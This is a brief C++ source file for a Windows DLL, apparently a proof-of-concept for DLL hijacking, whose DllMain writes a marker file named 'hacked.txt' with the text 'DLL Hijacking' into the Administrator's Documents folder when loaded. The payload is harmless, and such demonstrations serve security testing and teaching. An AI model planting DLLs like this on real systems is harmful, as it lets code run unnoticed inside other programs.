#include "pch.h"
#include <Windows.h>
#include <string> 
using namespace std;

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    HANDLE hFile = CreateFile(
        L"C:\\Users\\Administrator\\Documents\\hacked.txt",     // Set custom file path and name
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_NEW,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    string customText = "DLL Hijacking";      // Set custom text
    DWORD bytesWritten;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        WriteFile(
            hFile,
            customText.c_str(),
            customText.size(),
            &bytesWritten,
            NULL);

        CloseHandle(hFile);

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

